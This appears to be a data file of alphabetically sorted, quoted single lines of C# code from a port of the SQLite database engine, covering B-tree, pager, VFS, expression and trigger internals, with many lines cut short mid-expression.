"      pColl = sqlite3FindCollSeq( db, (u8)enc2, zName, 1 )"
"      pColl = sqlite3FindCollSeq( db, SQLITE_UTF8, ""NOCASE"", 0 )"
"      pColl = sqlite3FindCollSeq( db, enc, zName, initbusy )"
"      pCost.plan.u.pIdx.zName : ""(none)"", pCost.nRow,"
"      pCost.rCost, pCost.plan.wsFlags, pCost.plan.nEq )"
"      pCur.aiIdx[pCur.iPage - 1],"
"      pCur.apPage[pCur.iPage - 1],"
"      pCur.pgnoRoot, nKey, nData, pPage.pgno,"
"      pDbPage = sqlite3PagerLookup(pBt.pPager, pgno)"
"      pDef = sqlite3FindFunction( db, pExpr.u.zToken, sqlite3Strlen30( pExpr.u.zToken ),"
"      pDef = sqlite3FindFunction( db, zName, sqlite3Strlen30( zName ),"
"      pDup = sqlite3SelectDup( db, pView.pSelect, 0 )"
"      pE = sqlite3PExpr( pParse, TK_EQ, pE1c, pE2c, null )"
"      pE1a = sqlite3CreateIdExpr( pParse, zCol )"
"      pE1b = sqlite3CreateIdExpr( pParse, zAlias1 )"
"      pE1c = sqlite3PExpr( pParse, TK_DOT, pE1b, pE1a, null )"
"      pE2a = sqlite3CreateIdExpr( pParse, zCol )"
"      pE2b = sqlite3CreateIdExpr( pParse, zAlias2 )"
"      pE2c = sqlite3PExpr( pParse, TK_DOT, pE2b, pE2a, null )"
"      pExpr.pLeft.pColl = sqlite3ExprCollSeq( pParse, pExpr.pLeft )"
"      pExpr.pRight.pColl = sqlite3ExprCollSeq( pParse, pExpr.pRight )"
"      pFKey.zTo = pTo.z.Substring( 0, pTo.n )"
"      pFile.fs.GetHashCode(), locktype, pFile.locktype, pFile.sharedLockByte )"
"      pFile.locktype, pFile.sharedLockByte )"
"      pFile.sectorSize = (ulong)getSectorSize( pVfs, zUtf8Name )"
"      pIndex = (Index)sqlite3HashInsert( ref pHash, zIdxName, len, null )"
"      pIndex = sqlite3FindIndex( db, pName.a[0].zName, pName.a[0].zDatabase )"
"      pIndex = sqlite3FindIndex( db, z, zDb )"
"      pIndex = sqlite3FindIndex( pInfo.db, argv[0], pInfo.zDatabase )"
"      pInfo.aCol,"
"      pInfo.aFunc,"
"      pItem.zDatabase = sqlite3NameFromToken( db, pDatabase )"
"      pItem.zName = sqlite3NameFromToken( db, pTable )"
"      pKey = sqlite3IndexKeyinfo( pParse, pIndex )"
"      pKey, P4_KEYINFO_HANDOFF )"
"      pKeyMerge, P4_KEYINFO_HANDOFF )"
"      pLeft = rowSetNDeepTree( ref ppList, iDepth - 1 )"
"      pList = sqlite3SrcListEnlarge( db, pList, 1, pList.nSrc )"
"      pList.a,"
"      pList.a[i].zName = sqlite3NameFromToken( db, pToken )"
"      pMeta = sqlite3Get4byte(pBt.pPage1.aData, 36 "
"      pName.a[0].zName, pName.a[0].zDatabase )"
"      pNew = sqlite3ExprAlloc( db, TK_FUNCTION, pToken, 1 )"
"      pNew.pEList = sqlite3ExprListDup( db, p.pEList, flags )"
"      pNew.pGroupBy = sqlite3ExprListDup( db, p.pGroupBy, flags )"
"      pNew.pHaving = sqlite3ExprDup( db, p.pHaving, flags )"
"      pNew.pLimit = sqlite3ExprDup( db, p.pLimit, flags )"
"      pNew.pOffset = sqlite3ExprDup( db, p.pOffset, flags )"
"      pNew.pOrderBy = sqlite3ExprListDup( db, p.pOrderBy, flags )"
"      pNew.pPrior = sqlite3SelectDup( db, p.pPrior, flags )"
"      pNew.pSrc = sqlite3SrcListDup( db, p.pSrc, flags )"
"      pNew.pWhere = sqlite3ExprDup( db, p.pWhere, flags )"
"      pNew.zName = sqlite3MPrintf( db, ""sqlite_altertab_%s"", pTab.zName )"
"      pOld = (Index)sqlite3HashInsert( ref p.pSchema.idxHash, zName,"
"      pOp = sqlite3VdbeGetOp( v, -1 )"
"      pOther = functionSearch( pHash, h, pDef.zName, nName )"
"      pOut.pExpr = sqlite3PExpr(pParse, op, 0, 0, pValue)"
"      pOut.pExpr = sqlite3PExpr(pParse, op, pLeft.pExpr, pRight.pExpr, 0)"
"      pOut.pExpr = sqlite3PExpr(pParse, op, pOperand.pExpr, 0, 0)"
"      pPager.zFilename, zMaster, pPager.dbSize )"
"      pParse.db.aDb[iDb].zName, SCHEMA_TABLE( iDb ), iTable, r1, r1 )"
"      pParse.sLastToken.z = """""
"      pParse.zErrMsg = sqlite3VMPrintf( db, zFormat, ap )"
"      pPg = pager_lookup( pPager, pgno )"
"      pPgOld = pager_lookup( pPager, pgno )"
"      pPgno = sqlite3Get4byte(pPtrmap, offset "
"      pPrior.pOrderBy = sqlite3ExprListDup( pParse.db, pOrderBy, 0 )"
"      pRegLeft = sqlite3ExprCodeTemp( pParse, pLeft, ref pFreeLeft )"
"      pRegRight = sqlite3ExprCodeTemp( pParse, pRight, ref pFreeRight )"
"      pRes = (sqlite3_value)sqlite3_aggregate_context( context, 0 )"
"      pSel = sqlite3SelectDup( db, pTable.pSelect, 0 )"
"      pSrc = sqlite3LocateTable( pParse, 0, pItem.zName, pItem.zDatabase )"
"      pSrc = sqlite3SrcListAppend( pParse.db, 0, pStep.target, 0 )"
"      pStmt, N, sqlite3_value_text, COLNAME_DECLTYPE )"
"      pStmt, N, sqlite3_value_text, COLNAME_NAME )"
"      pTab = sqlite3FindTable( db, z, zDb )"
"      pTab = sqlite3FindTable( db, zMasterName, db.aDb[iDb].zName )"
"      pTab = sqlite3FindTable( db, zTab, zDb )"
"      pTab = sqlite3LocateTable( pParse, 0, pItem.zName, pItem.zDatabase )"
"      pTab = sqlite3LocateTable( pParse, 0, pSrc.a[0].zName, pSrc.a[0].zDatabase )"
"      pTab = sqlite3LocateTable( pParse, isView,"
"      pTab = sqlite3SrcListLookup( pParse, pTabList )"
"      pTab = sqlite3SrcListLookup( pParse, pTableName )"
"      pTab->zName,"
"      pTrigger = (Trigger)sqlite3HashInsert( ref pHash, zName, sqlite3Strlen30( zName ), null )"
"      pTrigger = sqlite3TriggersExist( pParse, pTab, TK_DELETE, null, ref iDummy )"
"      pTrigger = sqlite3TriggersExist( pParse, pTab, TK_INSERT, null, ref tmask )"
"      pTrigger = sqlite3TriggersExist( pParse, pTab, TK_UPDATE, pChanges, ref iDummy )"
"      pTrigger.pColumns = sqlite3IdListDup( db, pColumns )"
"      pTrigger.pWhen = sqlite3ExprDup( db, pWhen, EXPRDUP_REDUCE )"
"      pTriggerStep = triggerStepAllocate( db, TK_DELETE, pTableName )"
"      pTriggerStep = triggerStepAllocate( db, TK_INSERT, pTableName )"
"      pTriggerStep = triggerStepAllocate( db, TK_UPDATE, pTableName )"
"      pUnlockConnection or pBlockingConnection, or both."
"      pUnlockConnection==0, remove the entry from the blocked connections"
"      pVfs.xDlClose( pVfs, pHandle )"
"      pVfs.xDlError( pVfs, nByte, ref zBufOut )"
"      pWInfo = sqlite3WhereBegin( pParse, pTabList, pWhere, ref NullOrderby, WHERE_ONEPASS_DESIRED )"
"      parseCell( pPage, iCell, ref pInfo )"
"      pc = get2byte(data, ptr)"
"      pcache1TruncateUnsafe( pCache, 0 )"
"      pgno = sqlite3Get4byte(pParent.aData, pRight)"
"      ppExpr = sqlite3ExprAnd( pParse.db, ppExpr, pE )"
"      ppPage = btreePageFromDbPage(pDbPage, pgno, pBt)"
"      prereqAll = exprTableUsage( pMaskSet, pExpr )"
"      prereqLeft = exprTableUsage( pMaskSet, pExpr.pLeft )"
"      public BenignMallocHooks( void_function xBenignBegin, void_function xBenignEnd )"
"      public Db[] aDbStatic = new Db[] { new Db(), new Db() }"
"      public EncName( string zName, u8 enc )"
"      public FuncDef( i16 nArg, u8 iPrefEnc, u8 iflags, object pUserData, FuncDef pNext, dxFunc xFunc, dxStep xStep, dxFinal xFinalize, string zName, FuncDef pHash )"
"      public FuncDef( string zName, u8 iPrefEnc, i16 nArg, int iArg, u8 iflags, dxFunc xFunc )"
"      public FuncDef( string zName, u8 iPrefEnc, i16 nArg, int iArg, u8 iflags, dxStep xStep, dxFinal xFinal )"
"      public FuncDef( string zName, u8 iPrefEnc, i16 nArg, object arg, dxFunc xFunc, u8 flags )"
"      public Keyword( u8 i, u8 nChar, u8 code )"
"      public Mem0Global( int nScratchFree, int nPageFree, sqlite3_mutex mutex, sqlite3_int64 alarmThreshold, dxalarmCallback alarmCallback, object alarmArg, int alarmBusy, int[] aScratchFree, int[] aPageFree )"
"      public PgHdr pDirty, pDirtyTail"
"      public PgHdr1 pLruHead, pLruTail"
"      public RowSet( sqlite3 db, int N )"
"      public SelectDest( u8 eDest, char affinity, int iParm )"
"      public SelectDest( u8 eDest, char affinity, int iParm, int iMem, int nMem )"
"      public Sqlite3Config( int bMemstat, int bCoreMutex, bool bFullMutex, int mxStrlen, int szLookaside, int nLookaside"
"      public Token( string z, Int32 n )"
"      public VdbeOpList( u8 opcode, int p1, int p2, int p3 )"
"      public _yyRuleInfo(YYCODETYPE lhs, byte nrhs)"
"      public compareInfo( char matchAll, char matchOne, char matchSet, bool noCase )"
"      public et_info( char fmttype,"
"      public int Y, M, D"
"      public int h, m"
"      public int mnReq, mxReq"
"      public int nHit, nMiss"
"      public int nRead, nWrite"
"      public int p1, p2"
"      public object pStart, pEnd"
"      public override int SharedLockFile( sqlite3_file pFile, long offset, long length )"
"      public sAggs( string zName, sbyte nArg, u8 argType, u8 needCollSeq, dxStep xStep, dxFinal xFinalize )"
"      public sFuncs( string zName, sbyte nArg, u8 argType, u8 eTextRep, u8 needCollSeq, dxFunc xFunc )"
"      public sPragmaType( string zName, int mask )"
"      public sqlite3AutoExtList( int nExt, dxInit[] aExt ) { this.nExt = nExt"
"      public sqlite3_io_methods( int iVersion,"
"      public sqlite3_pcache_methods( object pArg, dxPC_Init xInit, dxPC_Shutdown xShutdown, dxPC_Create xCreate, dxPC_Cachesize xCachesize, dxPC_Pagecount xPagecount, dxPC_Fetch xFetch, dxPC_Unpin xUnpin, dxPC_Rekey xRekey, dxPC_Truncate xTruncate, dxPC_Destroy xDestroy )"
"      public sqlite3_vfs( int iVersion,"
"      public string zSql = """""
"      public u8 op, p5"
"      public virtual int SharedLockFile( sqlite3_file pFile, long offset, long length )"
"      public virtual void LockFile( sqlite3_file pFile, long offset, long length )"
"      public virtual void UnlockFile( sqlite3_file pFile, long offset, long length )"
"      public yymsp(ref yyParser pointer_to_yyParser, int yyidx) //' Parser and Stack Index"
"      put2byte(data, 16, pBt.pageSize)"
"      put2byte(data, addr, start)"
"      put2byte(data, hdr "
"      put2byte(data, start "
"      put2byte(data, start, pbegin)"
"      put32bits( ac, val )"
"      put32bits( zHeader, aJournalMagic.Length "
"      rc = ( sqlite3OsSleep( pVfs, 1000 "
"      rc = addToVTrans(db, pVTab)"
"      rc = addToVTrans(db, sqlite3GetVTable(db, pTab))"
"      rc = allocateBtreePage(pBt, ref pNew, ref pgnoNew, 0, 0)"
"      rc = btreeCreateTable(p, ref piTable, flags)"
"      rc = btreeCursor(p, iTable, wrFlag, pKeyInfo, pCur)"
"      rc = btreeDropTable(p, (u32)iTable, ref piMoved)"
"      rc = btreeGetPage(pBt, (Pgno)iTable, ref pPage, 0)"
"      rc = btreeGetPage(pBt, 1, ref pPage1, 0)"
"      rc = btreeGetPage(pBt, pgno, ref ppPage, 0)"
"      rc = btreeMoveto(pCur, pCur.pKey, pCur.nKey, 0, ref pCur.skipNext)"
"      rc = clearCell(pPage, pCell)"
"      rc = createCollation( db, zName, enc, pCtx, xCompare, null )"
"      rc = createCollation( db, zName, enc, pCtx, xCompare, xDel )"
"      rc = execExecSql( db,"
"      rc = execSql( db, ""BEGIN EXCLUSIVE"
"      rc = execSql( db, ""PRAGMA vacuum_db.synchronous=OFF"" )"
"      rc = execSql( db, zSql )"
"      rc = execSql( db,"
"      rc = fillInCell(pPage, newCell, pKey, nKey, pData, nData, nZero, ref szNew)"
"      rc = freeSpace(pPage, pc, sz)"
"      rc = getAndInitPage(pBt, newPgno, ref pNewPage)"
"      rc = getAndInitPage(pBt, pgno, ref pPage)"
"      rc = memcmp( pKey1, pKey2, n )"
"      rc = p.xFunc( p.pArg, p.nBusy )"
"      rc = pVfs.xOpen( pVfs, zPath, pFile, flags, ref pFlagsOut )"
"      rc = pWalker.xExprCallback( pWalker, ref pExpr )"
"      rc = pager_end_transaction( pPager, pPager.setMaster )"
"      rc = pager_wait_on_lock( pPager, EXCLUSIVE_LOCK )"
"      rc = ptrmapGet(pCheck.pBt, iChild, ref ePtrmapType, ref iPtrmapParent)"
"      rc = querySharedCacheTableLock(p, MASTER_ROOT, READ_LOCK)"
"      rc = read32bits( jfd, pOffset, ref pgno )"
"      rc = readMasterJournal( pPager.jfd, zMaster, (u32)pPager.pVfs.mxPathname "
"      rc = saveAllCursors(pBt, (Pgno)iTable, null)"
"      rc = saveAllCursors(pBt, 0, null)"
"      rc = saveAllCursors(pBt, pCur.pgnoRoot, pCur)"
"      rc = sqlite3ApiExit( db, SQLITE_OK )"
"      rc = sqlite3ApiExit( db, rc )"
"      rc = sqlite3BitvecTest( null, 0 ) "
"      rc = sqlite3BtreeCommitPhaseOne(p, null)"
"      rc = sqlite3BtreeFactory( db, zFile, false, SQLITE_DEFAULT_CACHE_SIZE,"
"      rc = sqlite3BtreeFactory( db, zFilename, false, SQLITE_DEFAULT_CACHE_SIZE,"
"      rc = sqlite3BtreeKeySize( pCur, ref nCellKey )"
"      rc = sqlite3BtreeKeySize(pCur, ref pCur.nKey)"
"      rc = sqlite3BtreeMovetoUnpacked(pCur, pIdxKey, nKey, bias != 0 "
"      rc = sqlite3BtreeOpen( zFilename, db, ref ppBtree, btFlags, vfsFlags )"
"      rc = sqlite3BtreeSetPageSize( pMain, sqlite3BtreeGetPageSize( pTemp ), nRes, 1 )"
"      rc = sqlite3CreateFunc( db, zFunctionName, nArg, enc, p, xFunc, xStep, xFinal )"
"      rc = sqlite3LoadExtension( db, zFile, zProc, ref pzErrMsg )"
"      rc = sqlite3LockAndPrepare( db, zSql, -1, 1, ref pNew, ref dummy )"
"      rc = sqlite3LockAndPrepare( db, zSql, nBytes, 0, ref  ppStmt, ref pzTail )"
"      rc = sqlite3LockAndPrepare( db, zSql, nBytes, 1, ref  ppStmt, ref pzTail )"
"      rc = sqlite3OsAccess( pVfs, pPager.zJournal, SQLITE_ACCESS_EXISTS, ref exists )"
"      rc = sqlite3OsFileSize( pPager.jfd, ref szJ )"
"      rc = sqlite3OsOpen( pPager.pVfs, null, pFile, vfsFlags, ref dummy )"
"      rc = sqlite3OsRead( jfd, aData, pPager.pageSize, ( pOffset ) "
"      rc = sqlite3OsRead( pPager.fd, pPg.pData, pPager.pageSize, iOffset )"
"      rc = sqlite3PagerAcquire(pBt.pPager, pgno, ref pDbPage, (u8)noContent)"
"      rc = sqlite3PagerGet(pBt.pPager, (u32)iPtrmap, ref pDbPage)"
"      rc = sqlite3PagerGet(pBt.pPager, iPtrmap, ref pDbPage)"
"      rc = sqlite3PagerMovepage(pPager, pDbPage.pDbPage, iFreePage, isCommit)"
"      rc = sqlite3PagerPagecount(pBt.pPager, ref nPage)"
"      rc = sqlite3PagerSetPagesize(pBt.pPager, ref pBt.pageSize, nReserve)"
"      rc = sqlite3Prepare( db, zSql, nBytes, saveSqlFlag, ref ppStmt, ref pzTail )"
"      rc = sqlite3VdbeMemFromBtree( pC.pCursor, 0, (int)nCellKey, true, m )"
"      rc = sqlite3VdbeMemFromBtree( pCur, 0, (int)nCellKey, true, m )"
"      rc = sqlite3VdbeMemSetStr( pColName, zName, -1, SQLITE_UTF8, xDel )"
"      rc = sqlite3VtabSync( db, p.zErrMsg )"
"      rc = sqlite3_prepare( db, zSql, -1, ref pStmt, ref Dummy )"
"      rc = vdbeUnbind( p, i )"
"      rc = winFullPathname( pVfs, zRelative, MAX_PATH, zFullpath )"
"      ref pInfo.nColumn,"
"      ref pInfo.nColumnAlloc,"
"      ref pInfo.nFunc,"
"      ref pInfo.nFuncAlloc,"
"      ref pList.nAlloc,"
"      ref pList.nId,"
"      regArgs = sqlite3GetTempRange( pParse, 4 )"
"      regAutoinc = autoIncBegin( pParse, iDb, pTab )"
"      regAutoinc = autoIncBegin( pParse, iDbDest, pDest )"
"      regBase = sqlite3GetTempRange( pParse, nCol "
"      regIdxKey = sqlite3GenerateIndexKey( pParse, pIndex, iTab, regRecord, true )"
"      regPrev, pKeyDup, P4_KEYINFO_HANDOFF, labelEnd )"
"      releaseMemArray( p.aColName, p.nResColumn "
"      releaseMemArray( p.aMem, p.nMem )"
"      releaseMemArray( p.aVar, p.nVar )"
"      releaseMemArray( p.pResultSet, p.nMem )"
"      reloadTableSchema( pParse, pTab, pTab.zName )"
"      reloadTableSchema( pParse, pTab, zName )"
"      renameTableFunc, null, null )"
"      renameTriggerFunc, null, null )"
"      res = sqlite3VdbeRecordCompare( m.n, m.zBLOB, pUnpacked )"
"      return ( Int32.TryParse( inStr.Substring( 0, i ), out result ) "
"      return (Table)sqlite3HashFind( pTrigger.pTabSchema.tblHash, pTrigger.table, n )"
"      return CSSQLite.sqlite3_column_int64( vm, index )"
"      return CSSQLite.sqlite3_column_text( vm, index )"
"      return ExprHasProperty( pExpr, EP_Error ) "
"      return Int64.TryParse( zNum.Substring( 0, i ), out pNum"
"      return accessPayload(pCur, offset, amt, pBuf, 0)"
"      return bindText( pStmt, i, zData, nData, xDel, 0 )"
"      return bindText( pStmt, i, zData, nData, xDel, SQLITE_UTF8 )"
"      return cellSizePtr(pPage, findCell(pPage, iCell))"
"      return exprDup( db, p, flags, ref ExprDummy )"
"      return exprIsConst( p, 1 )"
"      return exprIsConst( p, 2 )"
"      return exprIsConst( p, 3 )"
"      return findCell(pPage, iCell)"
"      return get2byte(pPage.aData, (pPage).cellOffset "
"      return getLastErrorMsg( nBuf, ref zBuf )"
"      return id.pMethods.xCheckReservedLock( id, ref pResOut )"
"      return id.pMethods.xFileControl( id, (int)op, ref pArg )"
"      return id.pMethods.xFileSize( id, ref pSize )"
"      return id.pMethods.xLock( id, lockType )"
"      return id.pMethods.xRead( id, pBuf, amt, offset )"
"      return id.pMethods.xSync( id, flags )"
"      return id.pMethods.xTruncate( id, size )"
"      return id.pMethods.xUnlock( id, lockType )"
"      return id.pMethods.xWrite( id, pBuf, amt, offset )"
"      return keywordCode( z, 0, n )"
"      return openDatabase( filename, ref ppDb, flags, zVfs )"
"      return openDatabase( zFilename, ref ppDb,"
"      return pVfs.xAccess( pVfs, zPath, flags, ref pResOut )"
"      return pVfs.xCurrentTime( pVfs, ref pTimeOut )"
"      return pVfs.xDelete( pVfs, zPath, dirSync )"
"      return pVfs.xDlOpen( pVfs, zPath )"
"      return pVfs.xDlSym( pVfs, pHdle, zSym )"
"      return pVfs.xFullPathname( pVfs, zPath, nPathOut, zPathOut )"
"      return pVfs.xRandomness( pVfs, nByte, ref zBufOut )"
"      return pVfs.xSleep( pVfs, nMicro )"
"      return pager_error( pPager, rc )"
"      return sqlite3ApiExit( 0, rc )"
"      return sqlite3ApiExit( db, rc )"
"      return sqlite3BitvecTest( pPg.pPager.pInJournal, pPg.pgno ) != 0"
"      return sqlite3Expr( pParse.db, TK_ID, zName )"
"      return sqlite3ExprAlloc( db, op, x, 0 )"
"      return sqlite3ExprCodeTarget( pParse, pExpr, target )"
"      return sqlite3ExprFunction( pParse, null, pToken )"
"      return sqlite3ExprFunction( pParse, pList, null )"
"      return sqlite3ExprListAppend( pParse, null, pExpr )"
"      return sqlite3GetVarint32( p, (int)offset, ref v )"
"      return sqlite3GetVarint32( p, 0, ref v )"
"      return sqlite3GetVarint32( p, offset, ref v )"
"      return sqlite3JoinType( pParse, pA, null, null )"
"      return sqlite3JoinType( pParse, pA, pB, null )"
"      return sqlite3MemoryAlarm( xCallback, pArg, iThreshold )"
"      return sqlite3OsUnlock( pFd, eLock )"
"      return sqlite3OsWrite( fd, ac, 4, offset )"
"      return sqlite3PExpr( pParse, op, null, null, null )"
"      return sqlite3PExpr( pParse, op, null, null, pToken )"
"      return sqlite3PExpr( pParse, op, pLeft, null, null )"
"      return sqlite3PExpr( pParse, op, pLeft, null, pToken )"
"      return sqlite3PExpr( pParse, op, pLeft, pRight, null )"
"      return sqlite3PagerAcquire( pPager, pgno, ref ppPage, 0 )"
"      return sqlite3PutVarint( p, offset, v )"
"      return sqlite3Realloc( (byte[])pOld, n )"
"      return sqlite3ResolveOrderGroupBy( pParse, pSelect, pOrderBy, zType )"
"      return sqlite3SelectNew( pParse, null, pSrc, null, null, null, null, isDistinct, null, null )"
"      return sqlite3SrcListAppend( db, null, pTable, null )"
"      return sqlite3SrcListAppend( db, null, pTable, pDatabase )"
"      return sqlite3SrcListAppendFromTerm( pParse, p, null, null, pAlias, pSubquery, pOn, pUsing )"
"      return sqlite3SrcListAppendFromTerm( pParse, p, pTable, pDatabase, pAlias, null, pOn, pUsing )"
"      return sqlite3StrICmp( z1, z2 ) == 0"
"      return sqlite3TransferBindings( pFromStmt, pToStmt )"
"      return sqlite3ValueBytes( pVal, SQLITE_UTF16NATIVE )"
"      return sqlite3ValueBytes( pVal, SQLITE_UTF8 )"
"      return sqlite3ValueText( pVal, SQLITE_UTF8 )"
"      return sqlite3VdbeAddOp2( p, op, p1, (int)( b2 "
"      return sqlite3VdbeAddOp3( p, op, 0, 0, 0 )"
"      return sqlite3VdbeAddOp3( p, op, p1, 0, 0 )"
"      return sqlite3VdbeAddOp3( p, op, p1, p2, 0 )"
"      return sqlite3VdbeRecordCompare( nKey1, pKey1, 0, pPKey2 )"
"      return sqlite3_bind_int64( p, i, (i64)iValue )"
"      return sqlite3_exec( db, zSql, null, null, ref Errors )"
"      return sqlite3_exec( db, zSql, xCallback, pArg, ref Errors )"
"      return zDate != """" "
"      rollback, the contents of the cache are validated by checking"
"      selectAddColumnTypeAndCollation( pParse, pTab.nCol, pTab.aCol, pSelect )"
"      selectColumnsFromExprList( pParse, pSelect.pEList, ref pTab.nCol, ref pTab.aCol )"
"      set to db, then invoke the configured unlock-notify callback and"
"      set to db, then set pBlockingConnection=0."
"      setLikeOptFlag( db, ""glob"", SQLITE_FUNC_LIKE "
"      setLikeOptFlag( db, ""like"","
"      setResultStrOrError( pCtx, ""string or blob too big"", -1,"
"      setResultStrOrError( pCtx, z, n, 0, xDel )"
"      setResultStrOrError( pCtx, z, n, SQLITE_UTF8, SQLITE_TRANSIENT )"
"      setResultStrOrError( pCtx, z, n, SQLITE_UTF8, xDel )"
"      setupLookaside( db, null, sqlite3GlobalConfig.szLookaside,"
"      size, return the recycled buffer. Otherwise, free the buffer and"
"      sqlite3AuthCheck( pParse, SQLITE_SELECT, null, null, null )"
"      sqlite3BeginWriteOperation( pParse, ( pSelect != null "
"      sqlite3BeginWriteOperation( pParse, 0, iDb )"
"      sqlite3BeginWriteOperation( pParse, 1, iDb )"
"      sqlite3BeginWriteOperation( pParse, pTrigger != null "
"      sqlite3BeginWriteOperation( pParse, pVTab != null "
"      sqlite3BitvecClear( null, 1, pTmpSpace )"
"      sqlite3BitvecSet( null, (u32)1 )"
"      sqlite3BtreeSetAutoVacuum( pTemp, db.nextAutovac >= 0 "
"      sqlite3ChangeCookie( pParse, iDb )"
"      sqlite3CodeVerifySchema( pParse, -1 )"
"      sqlite3CodeVerifySchema( pParse, iDb )"
"      sqlite3CodeVerifySchema( pParse, iDbSrc )"
"      sqlite3CreateFunc( db, ""glob"", 2, SQLITE_ANY,"
"      sqlite3CreateFunc( db, ""like"", 2, SQLITE_ANY, pInfo, (dxFunc)likeFunc, null, null )"
"      sqlite3CreateFunc( db, ""like"", 3, SQLITE_ANY, pInfo, (dxFunc)likeFunc, null, null )"
"      sqlite3CreateFunc( db, ""sqlite_rename_table"", 2, SQLITE_UTF8, 0,"
"      sqlite3CreateFunc( db, ""sqlite_rename_trigger"", 2, SQLITE_UTF8, 0,"
"      sqlite3DbFree(db, "
"      sqlite3DbFree(db, pTable->azModuleArg[j])"
"      sqlite3DbFree(db, zErr)"
"      sqlite3DbFree(p->dbMem, p->azModuleArg[i])"
"      sqlite3DebugPrintf( """
"      sqlite3DebugPrintf( ""%"
"      sqlite3DebugPrintf( "")"" )"
"      sqlite3DeleteTrigger( db, ref pParse.pNewTrigger )"
"      sqlite3DeleteTrigger( db, ref pTrig )"
"      sqlite3DeleteTriggerStep( db, ref pStepList )"
"      sqlite3DeleteTriggerStep( db, ref pTrigger.step_list )"
"      sqlite3DropTriggerPtr( pParse, pTrigger )"
"      sqlite3EndTable( pParse, null, sEnd, null )"
"      sqlite3Error( db, SQLITE_OK, 0 )"
"      sqlite3Error( db, rc, 0 )"
"      sqlite3Error( p.db, SQLITE_OK, 0 )"
"      sqlite3Error( p.pDestDb, rc, 0 )"
"      sqlite3Error(db, SQLITE_ERROR, zErr)"
"      sqlite3ErrorMsg( pParse, ""unable to identify the object to be reindexed"" )"
"      sqlite3ErrorMsg( pParse,"
"      sqlite3ErrorMsg(pParse, ""%s"", zErr)"
"      sqlite3ErrorMsg(pParse, ""near "
"      sqlite3ErrorMsg(pParse, ""parser stack overflow"")"
"      sqlite3ExprAttachSubtrees( pParse.db, p, pLeft, pRight )"
"      sqlite3ExprCacheAffinityChange( pParse, regData, pTab.nCol )"
"      sqlite3ExprCachePop( pParse, 1 )"
"      sqlite3ExprCacheStore( pParse, iTable, iColumn, iReg )"
"      sqlite3ExprCheckHeight( pParse, p.nHeight )"
"      sqlite3ExprClear( db, p )"
"      sqlite3ExprClear( db, pExpr )"
"      sqlite3ExprCode( pParse, pDbname, regArgs "
"      sqlite3ExprCode( pParse, pFilename, regArgs )"
"      sqlite3ExprCode( pParse, pKey, regArgs "
"      sqlite3ExprCodeConstants( pParse, pWhere )"
"      sqlite3ExprCodeExprList( pParse, pOrderBy, regBase, false )"
"      sqlite3ExprCodeMove( pParse, regData, regBase "
"      sqlite3ExprDelete( db, ref p.pHaving )"
"      sqlite3ExprDelete( db, ref p.pLimit )"
"      sqlite3ExprDelete( db, ref p.pOffset )"
"      sqlite3ExprDelete( db, ref p.pWhere )"
"      sqlite3ExprDelete( db, ref pDbname )"
"      sqlite3ExprDelete( db, ref pExpr )"
"      sqlite3ExprDelete( db, ref pExpr.pLeft )"
"      sqlite3ExprDelete( db, ref pExpr.pRight )"
"      sqlite3ExprDelete( db, ref pFilename )"
"      sqlite3ExprDelete( db, ref pKey )"
"      sqlite3ExprDelete( db, ref pOn )"
"      sqlite3ExprDelete( db, ref pSpan.pExpr )"
"      sqlite3ExprDelete( db, ref pTable.pCheck )"
"      sqlite3ExprDelete( db, ref pTrigger.pWhen )"
"      sqlite3ExprDelete( db, ref pWhen )"
"      sqlite3ExprDelete( db, ref pWhere )"
"      sqlite3ExprListDelete( db, ref p.pEList )"
"      sqlite3ExprListDelete( db, ref p.pGroupBy )"
"      sqlite3ExprListDelete( db, ref p.pOrderBy )"
"      sqlite3ExprListDelete( db, ref pChanges )"
"      sqlite3ExprListDelete( db, ref pEList )"
"      sqlite3ExprListDelete( db, ref pFromCol )"
"      sqlite3ExprListDelete( db, ref pList )"
"      sqlite3ExprListDelete( db, ref pToCol )"
"      sqlite3ExprListDelete( pParse.db, ref pList )"
"      sqlite3ExprSetHeight( pParse, pNew )"
"      sqlite3FixSrcList( sFix, pTableName ) != 0 )"
"      sqlite3GenerateRowIndexDelete( pParse, pTab, iCur, 0 )"
"      sqlite3GenerateRowIndexDelete( pParse, pTab, iCur, aRegIdx )"
"      sqlite3GlobalConfig.pcache.xRekey( pCache.pCache, p, p.pgno, newPgno )"
"      sqlite3GlobalConfig.pcache.xUnpin( pCache.pCache, p, 1 )"
"      sqlite3IdListDelete( db, ref pColumn )"
"      sqlite3IdListDelete( db, ref pColumns )"
"      sqlite3IdListDelete( db, ref pTrigger.pColumns )"
"      sqlite3IdListDelete( db, ref pUsing )"
"      sqlite3InitCallback( initData, 3, azArg, null )"
"      sqlite3MemFree,"
"      sqlite3MemMalloc,"
"      sqlite3MemRealloc,"
"      sqlite3MemRoundup,"
"      sqlite3MemSize,"
"      sqlite3MinimumFileFormat( pParse, iDb, pDflt != null "
"      sqlite3NestedParse( pParse,"
"      sqlite3OpcodeName( pOp.opcode ), pOp.p1, pOp.p2, pOp.p3, zP4, pOp.p5,"
"      sqlite3OpenTable( pParse, baseCur, iDb, pTab, op )"
"      sqlite3OpenTable( pParse, iDest, iDbDest, pDest, OP_OpenWrite )"
"      sqlite3OpenTable( pParse, iSrc, iDbSrc, pSrc, OP_OpenRead )"
"      sqlite3OpenTable( pParse, iTab, iDb, pTab, OP_OpenRead )"
"      sqlite3OsCurrentTime( db.pVfs, ref r )"
"      sqlite3OsFileControl( pPager.fd, SQLITE_FCNTL_DB_UNCHANGED, ref iDummy ) >= SQLITE_OK"
"      sqlite3OsSleep( db.pVfs, delay "
"      sqlite3PagerPagecount( pPager, ref idummy )"
"      sqlite3PagerSetCachesize(pBt.pPager, mxPage)"
"      sqlite3PagerSetSafetyLevel(pBt.pPager, level, fullSync != 0)"
"      sqlite3ParserFree(pEngine, null)"
"      sqlite3PcacheFetch( pPager.pPCache, pgno, 0, ref p )"
"      sqlite3PcacheFetch( pPager.pPCache, pgno, 0, ref pPg )"
"      sqlite3PcacheIterateDirty( pPager.pPCache, assertTruncateConstraintCb )"
"      sqlite3PcacheMove( pPg, pgno )"
"      sqlite3PcacheOpen(szPageDflt, nExtra, 0 == memDb,"
"      sqlite3PcacheSetCachesize( pPager.pPCache, mxPage )"
"      sqlite3PcacheTruncate( pCache, 0 )"
"      sqlite3PcacheTruncate( pPager.pPCache, pPager.dbSize )"
"      sqlite3Put4byte( A, 0, val )"
"      sqlite3Put4byte(data, 36 "
"      sqlite3Put4byte(pPage.aData, 4, 0)"
"      sqlite3Put4byte(pPage.aData, iTrunk)"
"      sqlite3Put4byte(pPage1.aData, (u32)32, iPage)"
